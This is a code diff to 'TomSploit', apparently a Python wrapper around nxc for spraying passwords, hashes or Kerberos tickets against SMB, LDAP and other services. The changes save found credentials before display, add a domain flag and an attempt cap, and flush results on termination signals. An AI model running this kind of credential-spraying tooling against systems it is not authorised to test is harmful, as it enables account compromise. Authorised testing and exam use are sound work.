         # Derive hostname / domain / DC / real IP from the gathered output.
         result.hostname = extract_hostname(result.target_info)
         result.domain = extract_domain(result.target_info)
+        if not result.domain and self.cfg.domain:
+            # operator-supplied -d, used when nxc's own output named no domain
+            result.domain = self.cfg.domain
 
         # DC detection signals (see detect_dc):
         #  - LDAP port open (member servers don't answer LDAP)
@@ -2340,7 +2617,7 @@ class TomSploit:
         if result.anon_ldap or result.anon_ldap_lines:
             ldap_open = True
         result.is_dc = detect_dc(result.target_info, ldap_open,
-                                 ldap_info, role_flag)
+                                 ldap_info, role_flag, self.cfg.domain)
 
         # SMB signing — only the SMB [*] info line carries it. Check the SMB
         # protocol lines and the anonymous-SMB probe output.
@@ -2380,14 +2657,15 @@ class TomSploit:
 
     # ── full scan ─
     def run(self) -> int:
-        self.reporter.banner()
+        self._init_log()
+        self._guard(self.reporter.banner)
         results: list[TargetResult] = []
         try:
             for target in self.cfg.targets:
                 if self._stop.is_set():
                     break
                 try:
-                    self.reporter.target_header(target)
+                    self._guard(self.reporter.target_header, target)
                     open_protos, closed = self._probe(target)
                     result = TargetResult(target=target,
                                           open_protocols=open_protos,
@@ -2395,25 +2673,34 @@ class TomSploit:
                     if not open_protos:
                         result.scanned = False
                         result.skipped_reason = "no open ports"
-                        self.reporter.no_open_ports()
                         results.append(result)
+                        self._guard(self.reporter.no_open_ports)
+                        self._persist(results)
                         continue
 
-                    self.reporter.port_probe(result)
+                    self._guard(self.reporter.port_probe, result)
                     if "smb" in result.open_protocols:
                         self._lockout_precheck(result)
-                    self.reporter.lockout_warning(result)
-                    self._scan_target(result)
-                    self.reporter.protocol_results(result)
-                    self.reporter.valid_section(result)
+                    self._guard(self.reporter.lockout_warning, result)
 
+                    self._scan_target(result)
+
+                    # Bank the findings BEFORE anything renders them. This
+                    # append used to sit after the reporter calls, so a display
+                    # bug in protocol_results/valid_section discarded the whole
+                    # TargetResult — the credentials this target actually found
+                    # never reached the summary, the JSON, or the creds file.
+                    results.append(result)
                     if self.cfg.creds_file and result.successes:
                         try:
                             append_creds(self.cfg.creds_file, result)
                         except OSError as exc:
                             print(f"  {YELLOW}[!] Could not write creds file: "
                                   f"{exc}{RESET}")
-                    results.append(result)
+                    self._persist(results)
+
+                    self._guard(self.reporter.protocol_results, result)
+                    self._guard(self.reporter.valid_section, result)
                 except KeyboardInterrupt:
                     raise
                 except Exception as exc:
@@ -2428,14 +2715,55 @@ class TomSploit:
                                           skipped_reason=f"error: {exc.__class__.__name__}")
                     results.append(failed)
         finally:
-            if not self._stop.is_set():
-                self.reporter.summary(results)
+            # Order matters: persist BEFORE rendering. Writing the artifacts
+            # first means a crash in summary/next_steps can no longer take the
+            # JSON and log down with it.
             if self.cfg.json_out:
-                self._write_json(results)
-            self._write_log(results)
+                self._guard(self._write_json, results)
+            self._guard(self._write_log, results)
             if not self._stop.is_set():
-                self.reporter.next_steps(results)
+                self._guard(self.reporter.summary, results)
+                self._guard(self.reporter.next_steps, results)
         return 130 if self._stop.is_set() else 0
+
+    def _init_log(self) -> None:
+        """Write the log header once, up front. Raw command output is then
+        appended by _log() as each command completes, so the file on disk is
+        always current — a kill at any point leaves everything gathered so
+        far, rather than an empty file."""
+        if not self.cfg.log_file:
+            return
+        try:
+            with self._log_lock, open(self.cfg.log_file, "w") as f:
+                f.write(f"tomsploit — "
+                        f"{datetime.now().isoformat(timespec='seconds')}\n")
+                f.write(f"targets:   {', '.join(self.cfg.targets)}\n")
+                f.write(f"protocols: {', '.join(self.cfg.protocols)}\n")
+                f.write(f"\n{'=' * 60}\n  RAW COMMAND OUTPUT\n{'=' * 60}\n\n")
+        except OSError as exc:
+            print(f"  {YELLOW}[!] Could not open log file: {exc}{RESET}")
+
+    def _guard(self, fn, *args) -> None:
+        """Run a display function so a rendering failure can never cost you
+        data. Everything the reporter does is cosmetic; nothing it raises
+        should abort a scan or discard a result."""
+        try:
+            fn(*args)
+        except KeyboardInterrupt:
+            raise
+        except Exception as exc:
+            self._clear_progress()
+            print(f"  {YELLOW}[!] display error in {getattr(fn, '__name__', fn)}: "
+                  f"{exc.__class__.__name__}: {exc}{RESET}")
+            if self.cfg.debug:
+                import traceback; traceback.print_exc()
+
+    def _persist(self, results: list[TargetResult]) -> None:
+        """Flush structured output after every target rather than only at the
+        end. A hard kill — OOM, closed terminal, exam VM reset — used to lose
+        the entire JSON and log; now it loses at most the target in flight."""
+        if self.cfg.json_out:
+            self._write_json(results)
 
     def _write_json(self, results: list[TargetResult]) -> None:
         def ser_succ(s: Success) -> dict:
@@ -2471,10 +2799,17 @@ class TomSploit:
             ],
         }
         try:
-            with open(self.cfg.json_out, "w") as f:
-                json.dump(payload, f, indent=2)
-        except OSError as exc:
-            print(f"  {YELLOW}[!] Could not write JSON: {exc}{RESET}")
+            # default=str: never let one odd value in a parsed nxc line turn
+            # into a TypeError that discards the whole file. A stringified
+            # oddity is infinitely better than no results.
+            tmp = self.cfg.json_out + ".tmp"
+            with open(tmp, "w") as f:
+                json.dump(payload, f, indent=2, default=str)
+            # atomic replace: a kill mid-write can't leave truncated JSON
+            os.replace(tmp, self.cfg.json_out)
+        except Exception as exc:
+            print(f"  {YELLOW}[!] Could not write JSON: "
+                  f"{exc.__class__.__name__}: {exc}{RESET}")
 
     def _write_log(self, results: list[TargetResult]) -> None:
         """Write the consolidated scan log (replaces nxc's per-call --log):
@@ -2484,16 +2819,8 @@ class TomSploit:
         if not self.cfg.log_file:
             return
         try:
-            with open(self.cfg.log_file, "w") as f:
-                f.write(f"tomsploit — "
-                        f"{datetime.now().isoformat(timespec='seconds')}\n")
-                f.write(f"targets:   {', '.join(self.cfg.targets)}\n")
-                f.write(f"protocols: {', '.join(self.cfg.protocols)}\n")
-                with self._log_lock:
-                    body = list(self._log_buf)
-                f.write(f"\n{'=' * 60}\n  RAW COMMAND OUTPUT\n{'=' * 60}\n")
-                f.write("\n\n".join(body) if body else "(no commands run)")
-                f.write(f"\n\n{'=' * 60}\n  RESULT SUMMARY\n{'=' * 60}\n")
+            with self._log_lock, open(self.cfg.log_file, "a") as f:
+                f.write(f"\n{'=' * 60}\n  RESULT SUMMARY\n{'=' * 60}\n")
                 for r in results:
                     head = r.target
                     if r.hostname or r.domain:
@@ -2586,6 +2913,11 @@ examples:
                    help="Password or path to passwords file.")
     p.add_argument("-H", "--hash",
                    help="NTLM hash (LM:NT or NT). May be a file of hashes.")
+    p.add_argument("-d", "--domain", metavar="DOMAIN",
+                   help="AD domain, passed to nxc as -d for domain-scope auth. "
+                        "Use when nxc guesses wrong, or when the target's own "
+                        "output doesn't name a domain. Ignored for "
+                        "--local-auth attempts.")
     p.add_argument("-k", "--kerberos", action="store_true",
                    help="Use Kerberos ticket cache (--use-kcache). "
                         "Requires KRB5CCNAME. Cannot mix with -p/-H.")
@@ -2609,6 +2941,13 @@ examples:
                    help=f"Parallel workers (default: {DEFAULT_WORKERS}).")
     p.add_argument("--protocols", metavar="LIST",
                    help=f"Comma-separated subset. Valid: {','.join(ALL_PROTOCOLS)}")
+    p.add_argument("--max-attempts", type=int, default=DEFAULT_MAX_ATTEMPTS,
+                   metavar="N",
+                   help=f"Refuse runs needing more than N nxc spawns "
+                        f"(default: {DEFAULT_MAX_ATTEMPTS}). tomsploit sprays a "
+                        f"credential set - wordlists belong in hydra.")
+    p.add_argument("--force", action="store_true",
+                   help="Run even if the attempt count exceeds --max-attempts.")
     p.add_argument("--no-port-probe", action="store_true",
                    help="Skip pre-flight TCP port probe.")
     p.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
@@ -2632,7 +2971,7 @@ examples:
 def build_config(args: argparse.Namespace) -> Config:
     """Validate the parsed args and expand files/CIDRs into one Config.
     Raises ValueError with a user-facing message on any bad combination."""
-    raw_targets = read_value_or_file(args.target)
+    raw_targets = read_value_or_file(args.target, "targets")
     targets = expand_targets(raw_targets, args.max_cidr_hosts)
     if not targets:
         raise ValueError("No targets after expansion.")
@@ -2653,16 +2992,22 @@ def build_config(args: argparse.Namespace) -> Config:
     else:
         if args.kerberos and (args.password or args.hash):
             raise ValueError("-k cannot combine with -p or -H.")
+        if args.kerberos and paired:
+            # kerberos builds one ticket-cache cred per user, so there is no
+            # secret list to pair against; accepting the flag silently
+            # implied a pairing that never happened.
+            raise ValueError("--paired has no meaning with -k (a ticket cache "
+                             "has no secret list to pair against).")
         if not args.kerberos and not args.password and not args.hash:
             raise ValueError("need one of -p, -H, --combo, or -k.")
         if not args.user:
             raise ValueError("need -u (or use --combo).")
 
-        users = read_value_or_file(args.user)
+        users = read_value_or_file(args.user, "users")
         if not users:
             raise ValueError("No users provided.")
-        passwords = read_value_or_file(args.password) if args.password else []
-        hashes = read_value_or_file(args.hash) if args.hash else []
+        passwords = read_value_or_file(args.password, "passwords") if args.password else []
+        hashes = read_value_or_file(args.hash, "hashes") if args.hash else []
 
         if paired:
             # (kerberos and no-secret are already rejected by the generic
@@ -2693,7 +3038,8 @@ def build_config(args: argparse.Namespace) -> Config:
         creds_file=args.creds_file, json_out=args.json_output,
         workers=args.workers, quiet=args.quiet, verbose=args.verbose,
         debug=args.debug, no_port_probe=args.no_port_probe,
-        paired=paired,
+        paired=paired, domain=(args.domain or "").strip(),
+        force=args.force, max_attempts=args.max_attempts,
     )
 
 
@@ -2735,6 +3081,25 @@ def main() -> int:
         else:
             os._exit(130)
     signal.signal(signal.SIGINT, _sigint)
+
+    def _sigterm(signum, _frame):
+        """SIGTERM / SIGHUP: cancel cleanly instead of dying where we stand.
+
+        Closing the terminal on a long run sends SIGHUP, and the default
+        disposition is immediate death — which used to mean the log summary
+        and the final JSON were never written. Route both through the same
+        cancel path as Ctrl-C so run()'s finally block still flushes."""
+        name = "SIGHUP" if signum == getattr(signal, "SIGHUP", -1) else "SIGTERM"
+        sys.stderr.write(f"\n  {YELLOW}{BOLD}⚠ {name} — flushing results and "
+                         f"stopping.{RESET}\n")
+        sys.stderr.flush()
+        runner.cancel()
+    for _sig in ("SIGTERM", "SIGHUP"):
+        if hasattr(signal, _sig):
+            try:
+                signal.signal(getattr(signal, _sig), _sigterm)
+            except (ValueError, OSError):
+                pass   # not the main thread, or unsupported platform
 
     _real_stdout = sys.stdout
     sys.stdout = _BlankCollapser(_real_stdout)
